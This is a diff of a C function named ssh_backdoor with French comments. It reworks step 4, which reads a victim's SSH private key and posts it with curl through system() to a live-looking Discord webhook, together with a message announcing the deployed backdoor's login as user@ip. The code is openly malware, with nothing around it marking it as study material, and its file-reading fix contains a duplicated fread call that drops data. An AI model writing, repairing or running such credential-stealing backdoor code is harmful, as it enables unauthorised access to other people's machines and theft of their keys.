@@ -199,14 +199,20 @@ void ssh_backdoor() {
 
   // 4. Exfiltrer clé privée via Discord
   char exfil_cmd[2048];
-  snprintf(
-      exfil_cmd, sizeof(exfil_cmd),
-      "curl -s -X POST -H 'Content-Type: application/json' "
-      "-d '{\"content\":\"🗝️ **Nouvelle clé SSH victim** "
-      "🗝️\\\\n\\\\n```\\n$(cat %s)\\n```\"}' "
-      "https://discord.com/api/webhooks/1485416783706853558/"
-      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB",
-      priv_key);
+  FILE *f = fopen(priv_key, "r");
+  char buffer[1500];
+  fread(buffer, 1, sizeof(buffer), f);
+  size_t n = fread(buffer, 1, sizeof(buffer) - 1, f);
+  buffer[n] = '\0';
+  fclose(f);
+  snprintf(exfil_cmd, sizeof(exfil_cmd),
+           "curl -s -X POST -H 'Content-Type: application/json' "
+           "-d '{\"content\":\"**Clé ssh**\\n\\n\\n %s\\n\\nSSH "
+           "backdoor deployed: ssh %s@%s\\n\"}' "
+           "https://discord.com/api/webhooks/1485416783706853558/"
+           "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_"
+           "9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB",
+           buffer, user, ip);
 
   system(exfil_cmd);
 
